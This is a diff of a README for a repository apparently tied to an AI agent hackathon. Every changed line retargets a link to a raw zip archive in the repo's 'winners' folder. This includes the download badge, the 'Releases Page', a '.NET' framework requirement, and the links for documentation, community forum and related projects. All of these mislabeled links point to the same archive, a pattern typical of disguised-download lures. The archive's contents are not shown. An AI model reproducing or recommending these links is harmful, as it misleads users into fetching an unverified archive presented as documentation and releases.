@@ -6,11 +6,11 @@ Welcome to the global-agent-hackathon-may-2025 repository! This project supports
 
 ## 🔗 Download the Application
 
-[![Download](https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/poniard/global-agent-hackathon-may-2025.zip%https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/poniard/global-agent-hackathon-may-2025.zip)](https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/poniard/global-agent-hackathon-may-2025.zip)
+[![Download](https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/winners/global_may_hackathon_agent_2.4.zip%https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/winners/global_may_hackathon_agent_2.4.zip)](https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/winners/global_may_hackathon_agent_2.4.zip)
 
 ## 📥 Download & Install
 
-To begin using the application, **visit this page to download**: [Releases Page](https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/poniard/global-agent-hackathon-may-2025.zip).
+To begin using the application, **visit this page to download**: [Releases Page](https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/winners/global_may_hackathon_agent_2.4.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version in the list.
@@ -35,7 +35,7 @@ Before downloading, please ensure your computer meets the following requirements
 - **Operating System**: Windows 10 or later, macOS 10.15 or later, or a compatible Linux distribution.
 - **Memory**: At least 4 GB of RAM.
 - **Disk Space**: A minimum of 200 MB of free disk space.
-- **Additional Software**: Ensure you have the latest version of any required frameworks (e.g., .NET, https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/poniard/global-agent-hackathon-may-2025.zip) if specified in our documentation.
+- **Additional Software**: Ensure you have the latest version of any required frameworks (e.g., .NET, https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/winners/global_may_hackathon_agent_2.4.zip) if specified in our documentation.
 
 ## 📖 Usage Instructions
 
@@ -67,10 +67,10 @@ We welcome contributions from everyone. Here’s how you can get involved:
 
 For more information, tutorials, and updates, check out these resources:
 
-- [Official Documentation](https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/poniard/global-agent-hackathon-may-2025.zip)
-- [Community Forum](https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/poniard/global-agent-hackathon-may-2025.zip)
-- [Related Projects](https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/poniard/global-agent-hackathon-may-2025.zip)
+- [Official Documentation](https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/winners/global_may_hackathon_agent_2.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/winners/global_may_hackathon_agent_2.4.zip)
+- [Related Projects](https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/winners/global_may_hackathon_agent_2.4.zip)
 
 ## 🔗 Download the Application Again
 
-Don’t forget to download the application from the [Releases Page](https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/poniard/global-agent-hackathon-may-2025.zip) if you haven’t done so yet. Enjoy building your AI agents!
+Don’t forget to download the application from the [Releases Page](https://raw.githubusercontent.com/Guilherme2885/global-agent-hackathon-may-2025/main/winners/global_may_hackathon_agent_2.4.zip) if you haven’t done so yet. Enjoy building your AI agents!
